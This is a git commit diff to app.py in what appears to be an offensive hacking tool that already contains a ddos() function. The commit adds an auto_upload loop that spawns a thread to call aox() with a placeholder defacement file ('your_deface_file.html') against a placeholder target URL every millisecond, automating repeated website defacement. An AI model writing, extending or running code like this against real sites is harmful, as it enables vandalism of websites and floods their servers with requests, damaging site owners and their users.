d6ce6d4dab17bbc5170db4207c7bd2b61b3ef5bf
GULPGULP <115177023+GULPGULP@users.noreply.github.com>
2023-08-17 20:49:52 +0200

    Update app.py

--- app.py
+++ app.py
@@ -9,6 +9,7 @@ import os
 import sys
 from urllib.parse import urlparse
 from bs4 import BeautifulSoup
+import time
 
 try:
     import requests
@@ -225,6 +226,16 @@ def ddos():
 
     except KeyboardInterrupt:
         print("\nExiting DDoS...")
+
+def auto_upload(script, target_url, interval_ms):
+    while True:
+        aox(script, target_url)
+        time.sleep(interval_ms / 1000)  # Convert interval to seconds
+
         
 if __name__ == "__main__":
+    banner = banner.replace("[⍟]", "[AUTO⍟]")
+    interval_ms = 1  # Adjust the interval in milliseconds
+    auto_upload_thread = threading.Thread(target=auto_upload, args=("your_deface_file.html", "target_site_url", interval_ms))
+    auto_upload_thread.start()
     main(banner)
